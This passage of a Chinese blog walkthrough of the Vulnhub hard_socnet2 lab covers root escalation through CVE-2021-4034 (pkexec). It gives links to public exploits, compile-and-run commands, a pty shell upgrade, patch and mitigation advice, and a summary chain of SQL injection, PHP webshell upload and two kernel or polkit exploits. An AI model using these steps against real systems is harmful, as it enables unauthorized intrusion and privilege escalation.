+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">参考链接：https://www.secpulse.com/archives/158063.html</span><br><span class="line">		https://www.freebuf.com/vuls/280445.html</span><br></pre></td></tr></table></figure>
+
+<p>将exp上传到目标机，赋予执行权限，编译，执行（也可以本地gcc编译exp再上传，赋权，执行）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">赋予执行权限		chmod u+x exploit.c</span><br><span class="line">编译		gcc exploit.c -o exp</span><br><span class="line">执行		./exp</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417212944873.png" alt="image-20220417212944873"></p>
+<p>利用CVE-2021-4034提权</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exp地址：https://github.com/berdav/CVE-2021-4034</span><br><span class="line">		https://github.com/nikaiw/CVE-2021-4034</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">漏洞概述：polkit是一个授权管理器，其系统架构由授权和身份验证代理组成，pkexec是其中polkit的其中一个工具，他的作用有点类似于sudo，允许用户以另一个用户身份执行命令</span><br><span class="line">polkit 提供了一个授权 API，供特权程序（“ MECHANISMS ” ）使用，通常通过某种形式的进程间通信机制为非特权程序（ “ SUBJECTS ”）提供服务。在这种情况下，该机制通常将主体视为不受信任。对于来自主体的每个请求，该机制需要确定该请求是否被授权，或者它是否应该拒绝为主体提供服务。使用 polkit API，一种机制可以将此决定转交给受信任的一方：polkit 权威。</span><br><span class="line">polkit 权限被实现为系统守护进程 polkitd (8)，它本身没有什么特权，因为它以 polkitd系统用户身份运行。机制、主体和认证代理使用系统消息总线与授权机构进行通信。</span><br><span class="line">除了作为授权之外，polkit 还允许用户通过验证管理用户或客户端所属会话的所有者来获得临时授权。这对于机制需要验证系统的操作员确实是用户还是管理用户的场景很有用</span><br><span class="line">plokit基本组成</span><br><span class="line">			polkit— 授权管理器</span><br><span class="line">			polkitd— polkit 系统守护进程</span><br><span class="line">			pkcheck— 检查一个进程是否被授权</span><br><span class="line">			pkaction— 获取有关已注册操作的详细信息</span><br><span class="line">			pkexec— 以另一个用户身份执行命令</span><br><span class="line">			pkttyagent— 文本认证助手</span><br><span class="line">受影响版本：Polkit预装在CentOS、Ubuntu、Debian、Redhat、Fedora、Gentoo、Mageia等多个Linux发行版上，2009年5月至今发布的所有 Polkit 版本</span><br><span class="line">不受影响版本：</span><br><span class="line">	CentOS：polkit-0.115</span><br><span class="line">	Ubuntu：policykit-1-0.105</span><br><span class="line">修复建议：</span><br><span class="line">1、临时解决方法, 将pkexec中的SUID-bit删除进行临时规避</span><br><span class="line">	chmod 0755 /usr/bin/pkexec</span><br><span class="line">2、永久解决方法</span><br><span class="line">	centos</span><br><span class="line">	rpm -qa polkit</span><br><span class="line">	yum -y update polkit</span><br><span class="line">	ubuntu</span><br><span class="line">	dpkg -l |grep policykit</span><br><span class="line">	apt-get -y install policykit-1</span><br><span class="line">3、不受影响版本</span><br><span class="line">    CentOS：</span><br><span class="line">    · CentOS 6：polkit-0.96-11.el6_10.2</span><br><span class="line">    · CentOS 7：polkit-0.112-26.el7_9.1</span><br><span class="line">    · CentOS 8.0：polkit-0.115-13.el8_5.1</span><br><span class="line">    · CentOS 8.2：polkit-0.115-11.el8_2.2</span><br><span class="line">    · CentOS 8.4：polkit-0.115-11.el8_4.2</span><br><span class="line">    Ubuntu：</span><br><span class="line">    · Ubuntu 14.04 ESM：policykit-1-0.105-4ubuntu3.14.04.6+esm1</span><br><span class="line">    · Ubuntu 16.04 ESM：policykit-1-0.105-14.1ubuntu0.5+esm1</span><br><span class="line">    · Ubuntu 18.04 LTS：policykit-1-0.105-20ubuntu0.18.04.6</span><br><span class="line">    · Ubuntu 20.04 LTS：policykit-1-0.105-26ubuntu1.2</span><br><span class="line">    · Ubuntu 21.10：policykit-1-0.105-31ubuntu0.1</span><br><span class="line">    Debain：</span><br><span class="line">    · ：policykit-1 0.105-18+deb9u2</span><br><span class="line">    · Debain stretch：policykit-1 0.105-18+deb9u2</span><br><span class="line">    · Debain buster：policykit-1 0.105-25+deb10u1</span><br><span class="line">    · Debain bullseye：policykit-1 0.105-31+deb11u1</span><br><span class="line">    · Debain bookworm,bullseye：policykit-1 0.105-31.1</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">参考链接：https://cloud.tencent.com/developer/article/1945253</span><br><span class="line">		https://chowdera.com/2022/02/202202080624363009.html</span><br><span class="line">		https://xz.aliyun.com/t/10870#toc-7</span><br></pre></td></tr></table></figure>
+
+<p>利用python3 exp提权</p>
+<p>将exp上传到目标机，赋予执行权限，执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">赋予执行权限		chmod u+x cve2021-4034.py</span><br><span class="line">执行		python3 cve2021-4034.py</span><br><span class="line">交互式shell		python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220418054705270.png" alt="image-20220418054705270"></p>
+<p>利用C exp提权</p>
+<p>将exp上传到目标机，编译，执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">编译		make</span><br><span class="line">执行		./cve-2021-4034</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220418055841792.png" alt="image-20220418055841792"></p>
+<p><img src="/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220418055904066.png" alt="image-20220418055904066"></p>
+<p>总结</p>
+<p>端口扫描开放80，8000 —— 访问web80端口得到登录注册界面 —— post型sql注入获取后台Email和密码 —— 进入后台搜索处存在sql注入，make post处存在任意文件上传 —— 上传php一句话getshell —— 分别利用CVE-2021-3493和CVE-2021-4034完成提权</p>
+<hr>
+<p>菜鸡打靶，大佬勿喷。如有错误，欢迎斧正。</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/&text=Vulnhub靶机之AdmX_new"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/&title=Vulnhub靶机之AdmX_new"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/&is_video=false&description=Vulnhub靶机之AdmX_new"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Vulnhub靶机之AdmX_new&body=Check out this article: http://example.com/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/&title=Vulnhub靶机之AdmX_new"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/&title=Vulnhub靶机之AdmX_new"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/&title=Vulnhub靶机之AdmX_new"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/&title=Vulnhub靶机之AdmX_new"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/&name=Vulnhub靶机之AdmX_new&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/&t=Vulnhub靶机之AdmX_new"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2022
+    Rsherhan
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Categories</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Articles</a></li><!--
+     --><!--
+       --><li><a href="/links/">Links</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+    <script async src="https://www.googletagmanager.com/gtag/js?id=3341494857"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', '3341494857');
+    </script>
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
